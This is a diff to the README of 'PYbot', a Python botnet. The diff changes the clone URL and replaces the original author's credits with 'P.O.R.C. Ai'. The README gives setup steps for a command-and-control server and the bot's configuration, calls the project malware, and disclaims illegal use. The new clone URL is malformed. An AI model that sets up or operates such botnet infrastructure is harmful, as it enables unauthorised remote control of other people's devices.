@@ -39,7 +39,7 @@ exit, logout | Disconnects from the C&C server
 
 # Installation
 1. Install Git and Python 3 on your server.
-2. Clone the PYbot Github repository to your server via Git: `$ git clone https://github.com/WodxTV/PYbot.git`.
+2. Clone the PYbot Github repository to your server via Git: `$ git clone https://github.com/samuelmwangi-yr.github.io/P.O.R.C-AI-py-botnet-Archon-s-WarHammer-/`.
 3. Change the host address and C&C port in the configuration section in [bot.py](/bot.py) to your server address and C&C port.
 4. Start the CnC server by executing the command: `$ python cnc.py <cnc port>`.
 5. Add accounts in [logins.txt](/logins.txt) using the format: `username:password`.
@@ -48,7 +48,5 @@ exit, logout | Disconnects from the C&C server
 *Compiling the malware and installing it on vulnerable devices won't be told as it's highly illegal to get remote access to devices without permission. Use of this project for illegal activities is at own risk! I'm not responsible for any of your taken actions!*
 
 # Author
-- **wodx**
-    - [Twitter](https://twitter.com/wodxgod)
-    - [YouTube](https://youtube.com/wodxgod)
-    - [PayPal](https://www.paypal.com/paypalme2/wodx)
+- **P.O.R.C. Ai**
+ 
